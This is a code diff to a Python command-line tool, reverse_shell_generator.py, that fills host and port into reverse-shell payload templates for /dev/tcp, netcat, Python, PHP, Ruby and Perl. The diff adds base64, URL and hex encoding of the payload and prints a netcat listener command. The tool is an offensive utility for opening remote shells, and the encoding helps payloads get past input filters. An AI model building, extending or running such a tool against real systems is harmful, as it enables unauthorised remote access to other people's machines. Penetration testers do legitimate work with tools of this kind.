@@ -6,6 +6,8 @@
 import argparse
 import os
 import json
+import base64
+import urllib.parse
 import colorama
 from colorama import Fore, Style
 
@@ -24,12 +26,26 @@ def banner():
     """ + Style.RESET_ALL)
 
 
-def generate_reverse_shell(host, port, type="bash", shell="sh"):
+def encode_payload(payload, encode):
+    if encode == "base64":
+        payload_encoded_bytes = base64.b64encode(payload.encode("utf-8"))
+        encoded_payload = str(payload_encoded_bytes, "utf-8")
+    elif encode == "urlencode":
+        encoded_payload = urllib.parse.quote(payload)
+    elif encode == "hex":
+        encoded_payload = payload.encode("utf-8").hex()
+
+    return encoded_payload
+
+def generate_reverse_shell(host, port, type="/dev/tcp", shell="sh", encode=None):
     path = os.path.dirname(os.path.abspath(__file__))
     with open(path + "/payloads.json") as json_file:
         payloads = json.load(json_file)
         
     payload = payloads[type].replace("$HOST", host).replace("$PORT", port).replace("$SHELL", shell)
+
+    if encode:
+        payload = encode_payload(payload, encode)
 
     return payload
 
@@ -41,7 +57,7 @@ required = parser.add_argument_group("required arguments")
 
 required.add_argument("-i","--host",help="host listening the connection")
 required.add_argument("-p","--port",help="port listening the connection")
-optional.add_argument("-t","--type",help="language or tool - Options: bash, sh, nc, python, python3, php, ruby, perl")
+optional.add_argument("-t","--type",help="language or tool - Options: /dev/tcp, nc, python, python3, php, ruby, perl")
 optional.add_argument("-s","--shell",help="shell - Options: sh, bash")
 optional.add_argument("-e","--encode",help="output encode - Options: base64, urlencode, hex")
 
@@ -59,14 +75,24 @@ if (not _host) or (not _port):
     print("Usage: python3 reverse_shell_generator.py [-i/--host] HOST [-p/--port] PORT [OPTIONS]" + Style.RESET_ALL)
 else:
     if not _type:
-        _type = "bash"
+        _type = "/dev/tcp"
 
     if not _shell:
-        _shell = "bash"
+        _shell = "sh"
+
+    if not _encode:
+        _encode = None
+    else:
+        if (
+            (_encode != "base64") and
+            (_encode != "urlencode") and
+            (_encode != "hex")
+        ):
+            print(Fore.LIGHTRED_EX + "-e/--encode only accept base64, urlencode, hex values" + Style.RESET_ALL)
+            exit()
 
     if (
-        (_type != "bash") and
-        (_type != "sh") and
+        (_type != "/dev/tcp") and
         (_type != "nc") and
         (_type != "python") and
         (_type != "python3") and
@@ -74,7 +100,7 @@ else:
         (_type != "ruby") and
         (_type != "perl")
     ):
-        print(Fore.LIGHTRED_EX + "-t/--type only accept bash, sh, nc, python, python3, php, ruby, perl values" + Style.RESET_ALL)
+        print(Fore.LIGHTRED_EX + "-t/--type only accept /dev/tcp, nc, python, python3, php, ruby, perl values" + Style.RESET_ALL)
         exit()
 
     if (_shell != "sh") and (_shell != "bash"):
@@ -82,4 +108,5 @@ else:
         exit()
 
     print(Fore.GREEN + "To listen the connection, run: nc -lnvp " + _port + " on host " + _host + Style.RESET_ALL)
-    print(Fore.GREEN + "Payload: " + Style.RESET_ALL + generate_reverse_shell(_host, _port, _type, _shell))
+    print(Fore.GREEN + "Payload: " + Style.RESET_ALL + generate_reverse_shell(_host, _port, _type, _shell, _encode))
+    exit()
